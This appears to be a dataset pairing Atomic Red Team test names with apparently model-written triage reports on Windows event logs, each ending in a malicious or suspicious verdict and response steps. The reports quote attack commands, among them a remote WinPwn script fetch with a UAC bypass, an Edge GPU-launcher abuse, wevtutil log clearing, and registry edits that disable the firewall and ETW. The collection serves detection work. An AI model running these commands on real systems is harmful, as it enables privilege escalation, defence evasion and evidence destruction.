WinPwn - UAC Bypass ccmstp technique,"Upon detailed analysis of the provided Windows event logs, certain patterns and indicators suggest that there may be evidence of malicious activity occurring on the host, Server002. Here's the breakdown of findings:

1. **PowerShell Logs:**
   - A PowerShell script executed with suspicious behavior: downloading and executing code from a GitHub repository (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`).
   - The script includes a UAC (User Account Control) bypass technique (`UACBypass -noninteractive -command ""C:\\windows\\system32\\calc.exe"" -technique ccmstp`), which is commonly associated with privilege escalation exploits.

2. **System Logs:**
   - Logs were cleared in rapid succession (`wevtutil cl` for System, Windows PowerShell, and Security channels) by the user `admin_test`, which is an indicator of a potential cover-up attempt after performing actions that the perpetrator doesn't want discovered.
   - The use of `wevtutil.exe` command for clearing logs is noted in the Sysmon logs, which corroborates this suspicious activity.

3. **Sysmon Logs:**
   - High integrity level processes related to system command utilities and PowerShell execution suggest an attempt to execute commands with elevated privileges.
   - Additional processes (`wevtutil.exe`, `conhost.exe`) traced back to `admin_test` account with a high integrity level signal actions trying to manipulate or read system logs.

4. **Security Logs:**
   - A specific security event (ID 1102) indicating security log clearance, which aligns with potential malicious behavior following PowerShell script execution.
   - Activities synchronized with the clearing of logs suggest tampering or unauthorized actions by a user exploiting an administrative account.

**Assessment and Conclusion:**
Given the combination of unusual PowerShell activity, attempts to bypass User Account Control, system and security log clearances, the involvement of an administrative account, and attempts to obfuscate actions via log clearance, the logs present indicators of compromise.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- **Immediate Actions:**
  1. Isolate the affected host (Server002) from the network to prevent further malicious activity or lateral movement within the network.
  2. Conduct an in-depth forensic analysis of the host to preserve evidence for further investigation.
  3. Reset credentials and enforce password policies for the `admin_test` account and closely monitor all administrative accounts.

- **Long-term Actions:**
  1. Strengthen PowerShell logging and alerting mechanisms to detect similar activities in the future.
  2. Conduct a thorough review of security configurations and ensure all patches are up to date.
  3. Provide security awareness training focusing on privilege escalation techniques and account misuse prevention.

The logs strongly suggest malicious activity aiming at privilege escalation, log tampering, and potential further compromises, necessitating immediate action and comprehensive review of security measures."
Disable .NET Event Tracing for Windows Via Registry (powershell),"Upon reviewing the provided Windows event logs, I have identified several activities and patterns that could be considered suspicious, warranting further investigation:

### Suspicious or Anomalous Behavior

1. **PowerShell Activity:**
   - The PowerShell logs indicate a command was executed to modify the Windows registry using `New-ItemProperty` to set a registry key `ETWEnabled` for .NET Framework located at `HKLM:\Software\Microsoft\.NETFramework` to `0`. Disabling ETW (Event Tracing for Windows) could be an indicator of someone trying to bypass event logging, which is a common tactic used in malicious activity to evade detection.

2. **Event Log Cleared:**
   - The system, Windows PowerShell, and security logs were cleared, with the `wevtutil cl` command executed by the `admin_test` account. Clearing event logs is another tactic often found in malicious activities as it attempts to erase traces of other suspicious actions.

3. **Time Manipulation:**
   - There is an instance of time manipulation of the system clock in the security and system logs, with a noted discrepancy (rollback of time). Adjusting the system time can be a tactic to confuse logging or mislead forensic investigations.

4. **Processes Executed:**
   - High integrity level processes, like `wevtutil.exe`, `powershell.exe`, and others that were executed by `admin_test`, are of high concern as they allow control over sensitive system components.

### Assessment

Based on the analysis of the logs:
- **Multiple signs of suspicious activities** are identified. These include registry modifications aimed at disabling monitoring, clearing of event logs, and unusual time adjustments which are all behaviors associated with attempts to evade detection and maintain persistence on the system.
- While not definitive of a compromise without further corroborating evidence, such activities strongly suggest the need for further investigation due to their alignment with known malicious tactics.

### Resolution

**SUSPICIOUS - Logs contain activity that doesn't look right and needs more investigation.**

### Guidance on How to Proceed

1. **Immediate Investigation:**
   - Conduct a thorough investigation of the `admin_test` account activities, including a review of recent logins and any system changes.
   - Check for additional indicators of compromise (IoCs) across the network and other hosts to determine the scope of potentially malicious activity.

2. **Forensic Collection:**
   - Perform a forensic analysis of `Server002` to capture disk images, memory dumps, and inspect for any additional signs of compromise, focusing on persistence mechanisms and data exfiltration paths.

3. **Enhance Monitoring:**
   - Increase monitoring of critical systems and enable more comprehensive logging to detect any anomalous activity as it happens.
   - Utilize advanced threat detection tools to analyze the behavior of users and processes across the network.

4. **Review and Update Policies:**
   - Review access controls and logging policies to ensure necessary data is retained in the future.
   - Consider implementing additional security controls, such as application whitelisting and more restrictive PowerShell execution policies.

5. **Mitigation Measures:**
   - Consider isolating the affected systems until they are examined and confirmed to be free of threats.
   - Conduct a security awareness session with users emphasizing the importance of not disabling security features or executing unauthorized scripts. 

These steps will help contain and uncover any underlying threats, ensuring better preparedness and response to similar incidents in the future."
LOLBAS Msedge to Spawn Process,"Upon a detailed analysis of the given Windows event logs, the following findings were determined:

### Suspicious or Anomalous Behavior:

1. **Event Log Clearing**: Logs indicate that system logs, Windows PowerShell logs, and security logs were cleared. This event is associated with typical malicious activities where the attacker attempts to cover their tracks by deleting logs:
   - **System Log (EventID: 104)**
   - **Security Log (EventID: 1102)**
   - Cleared by user ""SERVER002\admin_test""

2. **Use of Poweshell with Unusual Commands**: There is a PowerShell command execution containing obfuscated command lines likely to execute `calc.exe` as a GPU sandbox launcher. It uses a typical abuse technique of leveraging a built-in Windows application:
   - **Command Line**:
     ```
     powershell.exe & {$edgePath64 = ""\""C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe\"""", if (Test-Path $edgePath64) {, $edgePath = $edgePath64, } else {, $edgePath32 = ""\""C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\"""", if (Test-Path $edgePath32) {, $edgePath = $edgePath32, } else {, exit 1, }, }, & $edgePath --disable-gpu-sandbox --gpu-launcher=""C:\\Windows\\System32\\calc.exe &&"", sleep 5, taskkill -f -im msedge.exe, taskkill -f -im calc.exe, taskkill -f -im win32calc.exe}
     ```
   - This command execution is disguised to appear benign but seems designed to execute unintended applications.

3. **Repeated Invocation of Calculator (Calc.exe)**: Multiple instances of `calc.exe` being invoked within a short time:
   - Indication of processes that have a parent-child relationship with Microsoft Edge set up to misuse the GPU sandbox.

### Assessment:

These patterns match tactics used in realizing unauthorized operations, possibly for malicious intent. The log clearing, in conjunction with PowerShell usage, and the suspicious use of GUI executes with calc.exe, strongly align with attempts to obfuscate user actions and execute unauthorized commands. Such activities are consistent with efforts seen in cyber intrusions to establish and maintain access while masking operational footprints.

### Resolution: MALICIOUS

**Threat/Risk Identified**: The activities depicted are consistent with malicious behavior. The system shows sustained anomalous use of PowerShell and system resources to likely escalate privileges or establish persistence, together with actions to hide these operations by log clearance.

### Guidance & Next Steps:

1. **Immediate Security Response**:
   - Quarantine and analyze the involved host for further indicators of compromise.
   - Conduct a full malware and vulnerability scan on Server002.

2. **Log Review and Preservation**:
   - Replicate and protect remaining logs for forensic investigation.

3. **User Account Review**:
   - Evaluate accounts with a similar profile as `""SERVER002\admin_test""` and monitor for unusual activity.
   - Consider changing passwords and reviewing recent administrator activities.

4. **Audit and Mitigation Measures**:
   - Implement enhanced logging and monitoring to capture similar PowerShell executions.
   - Reinforce system hardening practices, and ensure frequent backups of log files.
  
5. **Incident Reporting and Communication**:
   - Formally document the incident and involve cybersecurity teams to broaden investigative scope if needed.
   - Ensure communication pathways for updates to network and security teams.

6. **Behavioral Analysis**:
   - Employ advanced threat detection with behavioral analysis systems to detect and alert upon similar suspicious sequences in the future."
Modify UsePartialEncryptionKey Registry entry,"Upon reviewing the provided Windows event logs, several indicators of potentially suspicious and possibly malicious activities are apparent:

1. **Log Clearing Activity:** There are multiple instances of the `wevtutil.exe` utility being used to clear different event logs, including the Sysmon, Application, and Security logs. The relevant Sysmon logs include:
   - `""CommandLine"":""\""C:\\Windows\\system32\\wevtutil.exe\"" cl Microsoft-Windows-Sysmon/Operational""`
   - `""CommandLine"":""\""C:\\Windows\\system32\\wevtutil.exe\"" cl Application""`
   - `""CommandLine"":""\""C:\\Windows\\system32\\wevtutil.exe\"" cl Security""`
   This activity on its own is quite suspicious as event log clearing is a common tactic used by threat actors to cover their tracks after compromising a system.

2. **Registry Modification via Command Execution:** The Sysmon logs show a command being executed through `cmd.exe` to modify the registry:
   - `""CommandLine"":""\""cmd.exe\"" /c reg add \""HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\"" /v UsePartialEncryptionKey /t REG_DWORD /d 2 /f""`
   Registry edits via the command line, especially under the guise of the logged-in user without apparent administrative approval, could suggest an effort to manipulate system configurations for malicious purposes, potentially related to encryption policies.

3. **Time Discrepancy and Manipulation:** There are several logs indicating changes to the system time:
   - `Security` and `System` logs showing events with minor adjustments to the system time by `svchost.exe`. Time manipulation is sometimes used to affect logging accuracy or the behavior of scheduled tasks.

4. **Process Execution Chain:** The logs reveal a chain of processes initiated by `wevtutil.exe`, with a high integrity level and the user `SERVER002\\admin_test`. The legitimacy of the user activity should be confirmed.

5. **Edge Update Processes:** The logs record numerous events related to the execution of Microsoft Edge Update processes, which, while generally benign, should be verified to ensure no tampering or abuse, especially since they appear amidst other suspicious activities.

### Assessment & Recommendations:

- **Resolution:** **MALICIOUS**
  The activity within the logs, particularly the clearing of log files and registry modifications without proper context, indicates malicious behavior intended to alter system state and cover tracks.

- **Guidance:**
  - Immediately audit user account activity for `admin_test` to determine if the suspicious actions are authorized or the result of a compromised account.
  - Investigate all system changes, particularly those to the registry and system time, to confirm intentional or unauthorized modifications.
  - Implement enhanced monitoring and alerting for further suspicious activities.
  - Conduct a comprehensive malware scan and integrity verification of critical system files, focusing on processes like `cmd.exe` and `wevtutil.exe`.
  - Consider restoring the system to a known good state if unauthorized changes to the registry pose risk to system stability or security."
Requires the BitLocker PIN for Pre-boot authentication,"Analyzing the provided Sysmon, System, and Security event logs from the Windows host, we need to identify any signs of suspicious or malicious activities.

### Findings:

1. **Usage of `wevtutil`**:
   - Multiple instances of `wevtutil.exe` are observed in the logs with the command lines such as `""C:\\Windows\\system32\\wevtutil.exe\"" cl Microsoft-Windows-Sysmon/Operational""`, `""C:\\Windows\\system32\\wevtutil.exe\"" cl Application""`, `""C:\\Windows\\system32\\wevtutil.exe\"" cl System""`, and `""C:\\Windows\\system32\\wevtutil.exe\"" cl Security""`.
   - `wevtutil` is a legitimate Windows utility to manage Windows Event logs. However, clearing logs with it can be indicative of an attempt to cover tracks.

2. **Cleared Event Logs**:
   - The logs indicate the event logs ""System"", ""Windows PowerShell"", and ""Security"" have been cleared, as shown in both the System and Security log entries with EventIDs `104` (System) and `1102` (Security).
   - Clearing of event logs especially Security logs can be a red flag, indicative of attempts to remove traces of malicious activities.

3. **Registry Modification via `cmd.exe`**:
   - An execution of `cmd.exe` with command-line to modify the registry key `HKLM\SOFTWARE\Policies\Microsoft\FVE` was observed, indicating an attempt to change BitLocker policies.
   - The command: `\""cmd.exe\"" /c reg add \""HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\"" /v UseAdvancedStartup /t REG_DWORD /d 1 /f` can potentially tweak settings related to drive encryption and startup parameters.

4. **Use of `whoami.exe` and `hostname.exe`**:
   - The `whoami.exe` and `hostname.exe` processes captured in the logs are used to fetch information about the logged-on user and machine name, respectively. They are common administrative commands but can also be used by attackers for reconnaissance purposes.

5. **System Time Change**:
   - The security event logs show a change in system time (`EventData` with ""PreviousTime"" and ""NewTime""). Frequent time adjustments can be a tactic used to confuse logs correlation.

### Assessment:

The combination of clearing critical event logs (`Security`, `System`, `Windows PowerShell`) along with suspicious changes in the registry and usage of administrative utilities makes the behavior in these logs highly suspect. While some processes and utilities like `whoami` and `hostname` can be common in legitimate administrative scripting, the surrounding context—especially the event log clearing—suggests potentially malicious intent or activity attempting to hide evidence.

### Conclusion:

- **Resolution: MALICIOUS**: Given the context, especially with the event logs being cleared and suspicious registry modifications, the logs indicate malicious activity.

### Guidance:

1. **Immediate Actions**:
   - Conduct a full incident response using the company's incident handling procedures.
   - Isolate the affected system to prevent further potential compromise or spread.
   - Perform a thorough forensic investigation to identify if additional compromises exist.

2. **Further Investigation**:
   - Review and correlate other logs from network devices, IDS/IPS, and any EDR solutions in place.
   - Look for lateral movement indicators or connections to known malicious C2 infrastructure.
   - Confirm any unauthorized changes made to the security configurations or policies.

3. **Preventive Measures**:
   - Reinforce logging policies and monitoring for suspicious log clearing activities.
   - Implement stricter controls around tools capable of modifying critical system areas like registry or altering security configurations barring legitimate administrative users.
   - Increase awareness and training for IT staff regarding the usage of built-in administrative tools and their potential misuse."
Disable Microsoft Defender Firewall via Registry,"### Detailed Analysis of Logs

Upon reviewing the series of logs provided, there are several noteworthy points to consider:

#### 1. Log File Clearance
- **Event ID 1102 & Sysmon Activity**: There are events indicating that the Security log (`EventID 1102`) has been cleared by the user `SERVER002\admin_test`. This is generally considered a suspicious activity as attackers often clear logs to cover their tracks. The corresponding Sysmon logs show the execution of `wevtutil.exe` by `admin_test`, which confirms the clearing of event logs.

#### 2. Time Manipulation
- **Event IDs 4616 and 1 (System)**: There were changes noted to the system time, as seen in events from both Security and System logs (`EventID 4616` and `EventID 1`). Unauthorized changes to system time can be used to manipulate timestamps of log entries.

#### 3. Privilege Escalation and Sensitive Privileges
- **Event ID 4672**: This event shows that the account `SERVER002\admin_test` was assigned elevated privileges such as `SeDebugPrivilege`, `SeBackupPrivilege`, and others. Elevated privileges are commonly sought by attackers to gain greater control over a system.

#### 4. Unusual Command Line Usage
- **Sysmon Event (Command Execution)**: The command line activity involving `reg.exe` to modify firewall settings (`EnableFirewall` to disabled) is unusual and could be indicative of an attempt to weaken the host's defenses.

#### 5. Multiple Logons and Usage of Remote Systems
- **Event ID 4624**: There are multiple logon events with `LogonType 3` (network logon), which might suggest access from network or remote systems (`WorkstationName: DESKTOP-3HL5B2P`).

#### 6. Use of Built-in Utilities
- **Sysmon Event (Command Execution)**: The execution of `cmd.exe`, `whoami.exe`, and other administrative utilities can often be seen in both benign and malicious scenarios. However, paired with the above activities, it raises further suspicion.

### Threat Assessment

Based on the logs, there appears to be multiple indicators that suggest suspicious and potential malicious activity:

- The clearing of logs is a significant red flag indicating potential cover-up activity.
- Changes to system time can indicate efforts to tamper with chronological evidence in logs. 
- Privilege escalation and sensitive privileges imply possible exploitation attempts.
- The firewall settings modification suggests an intentional effort to make the system more vulnerable.
- Repeated logons, especially from remote systems, may indicate lateral movement attempts or external access.

### Resolution

After assessing all indicators, the situation is classified as:

**MALICIOUS**

Given the presence of multiple high-risk activities—such as log clearance, privilege escalation, and firewall manipulation—there is a strong likelihood that the system is compromised.

### Guidance on How to Proceed

1. **Immediate Containment**: Disconnect the host from the network to prevent further malicious activities or lateral movement.
2. **Detailed Forensic Analysis**: Perform a full forensic analysis on the host to identify the root cause, vector of attack, and any resident malware.
3. **Review and Secure Access Controls**: Audit and update access controls, ensure privileged accounts are securely managed.
4. **Patch and Fortify Systems**: Ensure the system, including any relevant network interfaces, is fully patched and compliant with security policies.
5. **Monitor and Audit**: Implement enhanced monitoring on this and associated devices, and perform a security audit on related systems.

Consider involving incident response teams to investigate and remediate the issue thoroughly, ensuring similar attacks are prevented in the future."
Delete a single file - Windows cmd,"Based on the log entries provided from the Sysmon log, Security log, Application log, and System log, the following analysis details the findings of the suspicious behaviors, activities, and potential compromise indicators:

### Analysis:

1. **Command Line Activity and File Manipulation:**
   - Multiple `cmd.exe` process executions with specific command line activities related to file existence checks and manipulation (e.g., `IF EXIST` checks and `del` commands on `deleteme_T1551.004`) occurred frequently.
   - The filename `deleteme_T1551.004` appears as a placeholder or potentially a test/temporary file. The actions taken on this file are consistently logged, creating, checking existence or deleting, which may show automated script activity.
  
2. **Sysmon Log Clearing:**
   - The log contains entries where `wevtutil.exe` is used to clear logs specifically targeting ""Microsoft-Windows-Sysmon"", ""Application"", ""System"", and ""Security"" logs. This action is often linked with attempts to hide malicious activity.
   - Events indicating the execution of `wevtutil.exe` by the user `SERVER002\\admin_test` with high integrity are suspicious and typically indicative of log tampering.

3. **Security Log and System Log Clearing:**
   - Security and System logs were also cleared as seen with Event IDs 1102 in the security log and 104 in the system log. Log clearing is a substantial red flag, indicating possible attempts to cover tracks post intrusion.

4. **Time Change Events:**
   - There were time change events registered in the logs, coinciding temporally with potential malicious activities and log clearance, potentially used to manipulate timestamps for further concealment tactics.

5. **Presence of Host Enumeration Commands:**
   - `hostname.exe` and `whoami.exe` executions were logged, which may be part of routine administration but could also be indicative of reconnaissance activities typically coupled with malicious intent.

6. **Overall User and Process Context:**
   - Actions were performed under the `SERVER002\\admin_test` account. While having high privileges (such as High-Integrity Level), the actions performed are unusual for standard administrative operations, especially given the sequence of actions related to logging and file manipulation.

### Assessment:
The combination of log clearing, file manipulation, and the temporal alignment of these events suggests activities beyond typical administrative operations. The intent appears potentially malicious, particularly due to attempts to clear logs and potentially mask activities.

### Resolution:
**MALICIOUS**

### Guidance:
1. **Immediate Actions:**
   - Secure and isolate the compromised host to prevent further potential compromise.
   - Comprehensive review and enrichment of logs from network devices and other endpoints to understand the extent of the breach.
   - Review user account activities, especially `SERVER002\\admin_test`, across other systems for similar patterns.
   
2. **Long-term Actions:**
   - Consider implementing more robust logging and monitoring, especially around the use of administrative tools and commands that can clear or alter logs.
   - Enhance user behavior analytics to detect suspicious sequence patterns indicative of lateral movement and privilege escalation.
   - Re-evaluate security configurations and permissions, especially for high-level accounts.

Given these analyses and findings, further incident response measures should be engaged to secure the network and prevent further malicious activities."
Delete Prefetch File,"### Detailed Analysis of Logs:

#### Windows PowerShell Log:

- **Command Execution:** The logs show the execution of a PowerShell command intended to remove a file from the Prefetch directory:
   - `powershell.exe & {Remove-Item -Path (Join-Path ""$Env:SystemRoot\\prefetch\\"" (Get-ChildItem -Path ""$Env:SystemRoot\\prefetch\\*.pf"" -Name)[0])}`.
- **Analysis:** This command is somewhat suspicious because the Prefetch directory is involved in storing metadata about frequently accessed programs to optimize program launching. Removal of files from this directory can be a tactic to evade detection, although there might be legitimate reasons for such an execution such as maintenance or automated cleanup tasks.
  
#### Application Log:

- **Windows Defender Status:** The log indicates that Windows Defender is operational (`SECURITY_PRODUCT_STATE_ON`). This suggests that there might not be an active compromise that has disabled Windows Defender, though this information alone doesn't rule out other malicious activity.

#### Security Log:

- **Event 1102 (Log Clearing):** Logs indicate the security log was cleared by the user `admin_test`. This is a significant red flag, as clearing audit logs can be an indicator of an attempt to cover tracks after malicious activity.
- **Events 4624 and 4672:** These events indicate successful logons and special privilege assignments which are routine unless correlated with unexpected or unauthorized accounts.
- **Event 4616 (Time Change):** Date and time were changed by a system process. This is typical unless evidence shows tampering for malicious purposes.
  
#### System Log:

- **Event 104 (Log Clearing):** The system logs were also cleared by `admin_test`, mirroring activity in the security logs. Consistent log clearing is indicative of suspicious activity and should be thoroughly investigated.

#### Sysmon Log:

- **Command-Line Utility Use:** Activities like `wevtutil.exe` being used to clear logs (as inferred from Sysmon events) point to potentially malicious activity aiming to delete evidence.
- **Process Creation - PowerShell, Whoami, Hostname:** The `whoami.exe` and `hostname.exe` executions can be part of reconnaissance activities, especially preceding or succeeding suspected malicious actions, like clearing logs.

### Conclusion:
The combination of suspicious PowerShell usage, clearing of security and system logs by the user `admin_test`, and the presence of command-line utilities known for administrative functions (like `wevtutil.exe`) suggest that there may be attempts to cover tracks of potentially unauthorized actions or activities. These factors collectively indicate that the activity documented may be malicious.

### Resolution:

**MALICIOUS** - The logs provide multiple indicators that align with typical malicious behaviors such as log clearing, questionable PowerShell command executions, and use of command-line utilities associated with log management and system query. Immediate action is needed to further investigate `admin_test` activities, verify system integrity, and ensure no unauthorized changes have been made."
Clear Powershell History by Deleting History File,"Upon analyzing the provided Windows event logs, the following suspicious findings were identified:

1. **Log Clearing Events**:
   - **EventID 104 (System Log)**: Logs for the System and Windows PowerShell were cleared by the user `admin_test`. 
   - **EventID 1102 (Security Log)**: The security log was also cleared by the same user.
   - These actions suggest possible attempts to cover tracks, as legitimate administrative actions would typically not involve the back-to-back clearance of multiple log sources without any documented justification.

2. **Use of PowerShell with Suspicious Command**:
   - PowerShell logs indicate the usage of a command `Remove-Item (Get-PSReadlineOption).HistorySavePath` executed by the `admin_test` user. This action can be used to delete PowerShell command history, which is commonly done by attackers to hide their activities.

3. **Use of `wevtutil.exe`**:
   - Several instances where `wevtutil.exe` was used to clear logs (System, Security, and PowerShell) are captured in the Sysmon logs. The tool `wevtutil.exe` is a legitimate Windows tool for managing event logs, but its usage to clear logs aligns with behaviors attempting to hide malicious activities.

4. **Other Possibly Benign Activities**:
   - Time synchronization and system processes like `svchost.exe`, `whoami.exe`, and `hostname.exe` show expected behavior in routine operations without indicating overt malicious activity.

### Assessment:

The activities captured in the logs, specifically the clearing of multiple critical logs by `admin_test` and the PowerShell command aimed at erasing command history, are indicative of suspicious behavior likely associated with the concealment of nefarious activities. The usage of utilities like `wevtutil.exe` to systematically clear logs is a red flag and is not generally associated with legitimate administrative tasks performed by IT administrators without documented reason.

### Resolution:

- **SUSPICIOUS**: These activities warrant further investigation. Specific focus needs to be given to the context around the log-clearing activities and the accounts used, as well as any correlated network activity, file access, or known vulnerabilities that may exist on the system for potential exploitation.

### Guidance on Next Steps:

1. **Collect Additional Data**: Review any available network traffic logs, file access logs, and configurations to gain further insights into what changes were made during this timeframe.

2. **User Account Investigation**: Investigate the user account `admin_test` for additional anomalous behaviors or signs of compromise, such as unauthorized password changes or usage outside standard work hours.

3. **Malware Scan**: Run thorough malware scans to check for potential malicious scripts or binaries that may have been executed or planted.

4. **Security Audit**: Perform an audit of system patch levels, configurations, and vulnerabilities that could have been exploited in conjunction with these activities.

5. **Enhance Monitoring**: Increase the monitoring and alerting mechanisms on critical systems for anomalous log-clearing activities and questionable use of administrative tools like PowerShell and `wevtutil.exe`. 

The aim is to identify any potential breach or ongoing threat that could compromise the security of the system and mitigate such risks promptly."
WMIC bypass using local XSL file,"Upon analyzing the provided log entries, here are the observations and assessment:

### Suspicious Activities

1. **Event Log Clearing (Security Log EventID 1102):**
   - The security log contains an event indicating that the event logs were cleared by a user named `admin_test` with the SID `S-1-5-21-3962163828-2803415714-1403596700-1006`. This action can be suspicious, especially if it's unexpected or unauthorized, as attackers often clear logs to cover their tracks.

2. **Program Executions (Sysmon Log EventID 1):**
   - There is significant activity involving the executable `wevtutil.exe`, which is used for managing event logs (`Security`, `System`, `Windows PowerShell`). This tool can be used to clear event logs (as seen in the logs) and can indicate an attempt to obfuscate activities.

3. **Execution of Internal Windows Tools (Sysmon Log EventID 1):**
   - Tools like `wevtutil.exe`, `cmd.exe`, `wmic.exe`, and `powershell.exe` were executed. While these tools can be used for legitimate administrative tasks, they are often used in attacks to execute malicious scripts or commands indirectly.

4. **Execution of WMIC with Suspicious Command Line (Sysmon Log EventID 1):**
   - `wmic.exe` was executed with a command pointing to a file path that includes `AtomicRedTeam/T1220`, suggesting potential use of a tool or toolkit designed for security testing or possibly malicious payload execution preparation.

5. **Activities by `SYSTEM` and `NT AUTHORITY` User Accounts:**
   - Numerous activities executed under high privileges can indicate an attempt to perform actions without restriction, a common tactic in system compromises.

### Benign Activities

1. **Regular System Process Execution:**
   - The logs include routine system process activities like `svchost.exe`, `MicrosoftEdgeUpdate.exe`, `sppsvc.exe`, which are typical for Windows environment and don't necessarily indicate malicious intent without further context.

2. **Microsoft Edge Update Process:**
   - Frequent updates and tasks related to Microsoft Edge appear normal as systems update software regularly.

### Assessment

Based on the analysis, the logs exhibit activities that are suspicious and indicative of potential malicious activities:
- The clearing of event logs without documentation or rationale is a significant red flag.
- The existence of command-line executions involving potentially benign but manipulatable Windows tools suggests malicious intent.
- Use of toolkit paths like `AtomicRedTeam/T1220` without clear security testing context could indicate misuse for potential attack simulation or execution.

### Conclusion: **SUSPICIOUS**

The current assessment is marked as **SUSPICIOUS**. The logs reflect actions that warrant further investigation to determine if they were part of standard operations, security testing, or unauthorized activities. It is crucial to conduct a more in-depth investigation to confirm whether these actions were legitimate maintenance activities or indicative of a security breach.

### Recommended Actions

1. **Conduct a detailed audit** on actions by `admin_test`, including verifying if this user performed authorized maintenance activities during the observed period.
2. **Review the origin context** of command-line executions involving tools like `wmic`, `wevtutil`, and `powershell` to assess if they align with standard administrative practices.
3. **Enhance monitoring and alerts** for event log manipulations or clearings and ensure sufficient logging is enabled to detect similar activities in the future.
4. **Perform a full security analysis** to ensure that no further anomalies persist, potentially indicating deeper system compromise."
Invoke CHM with default Shortcut Command Execution,"Upon reviewing the provided Windows event logs, there are several indicators of potentially malicious activity:

1. **Log Clearing Events:**
   - The logs show a series of events with `EventID 104` in the System log, `EventID 1102` in the Security log, and corresponding `wevtutil` commands in the Sysmon log that indicate log clearing activity. These events have been performed by the user `admin_test`:
     - `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`
     - `wevtutil.exe cl Application`
     - `wevtutil.exe cl System`
     - `wevtutil.exe cl Security`
     - `wevtutil.exe cl ""Windows PowerShell""`
   - Clearing these logs without a legitimate administrative reason is a common indicator of malicious activity, as attackers often clear logs to cover their tracks.

2. **Suspicious PowerShell Commands:**
   - The PowerShell log entries reveal a possibly suspicious command: `powershell.exe & {Invoke-ATHCompiledHelp -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm}`. This suggests the use of a potentially custom or unknown PowerShell command within the context of regular execution. The `Invoke-ATHCompiledHelp` command does not correspond to standard or recognized PowerShell cmdlets and needs further investigation.

3. **Unusual Command Execution Patterns:**
   - Multiple instances of `powershell.exe`, `conhost.exe`, `wevtutil.exe`, `hostname.exe`, and `whoami.exe` are executed. While the use of `hostname.exe` and `whoami.exe` can be benign, their execution in conjunction with the clearing of logs and suspicious PowerShell commands may suggest reconnaissance activities to gather system information.
   
4. **Admin User Activity:**
   - The user `admin_test` appears frequently in these logs, performing log clearing and executing the suspicious PowerShell script, indicating potentially unauthorized or rogue administrator activities.

**Threat Assessment:**
The combination of log clearing activities, suspicious PowerShell execution, and potential reconnaissance strongly suggests a compromised host scenario. These activities resemble a typical attacker behavior pattern aiming to hide their presence and gather information, possibly for further exploitation.

**Resolution: MALICIOUS**

**Guidance:**
1. **Immediate Action:**
   - Isolate the affected host (`Server002`) from the network to prevent further potential damage or lateral movement.
   - Securely back up all relevant logs and any potentially malicious scripts or executables found on the system for further analysis.

2. **Further Investigation:**
   - Conduct a thorough forensic analysis on `Server002` to understand the scope of the compromise.
   - Identify and review any additional accounts that may have been affected or used during this timeframe.
   - Investigate network activity logs for any unusual or unauthorized external communication.

   - Change all passwords associated with the potentially compromised accounts.
   - Review and strengthen security policies, especially around log management and PowerShell execution.
   - Conduct a company-wide security awareness training focusing on detecting and reacting to suspicious activities."
MSXSL Bypass using remote files,"Upon analyzing the provided event logs, I have identified several activities that warrant a detailed examination. Here is the breakdown:

### **Suspicious & Anomalous Activities:**

1. **PowerShell & CMD Execution:**
   - The presence of `powershell.exe` and `cmd.exe` processes (Sysmon EventID: 1) being executed in succession with high integrity levels raises potential red flags. Notably, the PowerShell instance under the user `admin_test` executed just before several `wevtutil` actions, indicative of events log-related activities.

2. **Event Log Clearance:**
   - Events in both Security (`EventID 1102`) and System (`EventID 104`) logs indicate that the logs were cleared at the same timestamp.`admin_test` was responsible for these actions. Clearing logs is a common tactic to cover tracks after an intrusion or malicious activity.

3. **Time Change Events:**
   - Time discrepancies in the logs (Security EventID: 4616) are associated with the `svchost.exe` process, suggesting potential manipulation of system time, which is unusual in legitimate activities and may be used in attempts to evade detection.

4. **Use of MSXSL Tool:**
   - `cmd.exe` executed a command involving the `msxsl.exe` tool with external payloads being fetched from a web URL associated with the Atomic Red Team. This indicates the possibility of a lateral movement or exploitation simulation, typical in penetration testing or adversarial activity.

### **Assessment and Resolution:**

Based on the activities outlined, the presence of multiple indicators, such as the clearing of event logs, execution of scripts and command-line utilities with high privilege and external connections, strongly suggests that the activity in these logs is not consistent with benign user behavior. 

- **Suspicious Parallel Execution:** The coordinated execution of system utilities and subsequent activities under the `admin_test` account, potentially without legitimate operational purposes, is suspicious.
- **Indicator of Compromise (IoC):** The logs include activities typically associated with malicious operations, including the cleaning of logs immediately following command executions.
- **Potential Malicious Activity:** The use of `msxsl.exe` with external payloads and the clearing of logs align with threat actor techniques such as T1027 (Obfuscated Files or Information) and T1070.001 (Indicator Removal on Host: Clear Windows Event Logs) from the MITRE ATT&CK framework.

### **Resolution:**
- **Resolution: MALICIOUS**

### **Guidance on How to Proceed:**
1. **Immediate Response:**
   - Isolate `Server002` from the network to prevent further potential lateral movement.
   - Initiate a comprehensive forensic investigation on `Server002` to acquire memory snapshots and disk images for deeper analysis.

2. **Log Monitoring:**
   - Enable advanced security logging and ensure that logs are securely stored in a centralized system where they can’t be tampered with locally.
   - Implement additional monitoring for the `admin_test` user and associated IP addresses for suspicious activities.

3. **Review Accounts and Permissions:**
   - Conduct a security audit of privileged accounts, especially `admin_test`, to ensure credentials have not been compromised.
   - Roll out mandatory changes of sensitive passwords across the network.

4. **Enhance Security Policies:**
   - Block the execution of potentially unwanted applications and scripts with AppLocker or other white-listing tools.
   - Educate staff about best practices for security and identify possible phishing or social engineering attacks that could have led to this incident.

5. **Network and Firewall Analysis:**
   - Analyze network traffic for any unusual outbound connections that may correlate with the detected malicious activity.

Modify UseTPMPIN Registry entry,"After reviewing the provided Windows event logs, I've noted a series of activities that warrant closer examination. Here's a detailed breakdown of the observed events and actions:

1. **Sysmon Log Analysis:**
   - Multiple invocations of `wevtutil.exe`, a utility used for managing Windows event logs, with the command `cl` followed by various log names (`Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, `Windows PowerShell`). The command `cl` is used to clear logs.
   - These occurrences of clearing event logs (EventID 1 with `wevtutil.exe` and corresponding log cleared messages) are performed by the same user account, `SERVER002\admin_test`, indicating possible log tampering or erasure of tracks, a common practice in post-compromise scenarios.

2. **Security Log Analysis:**
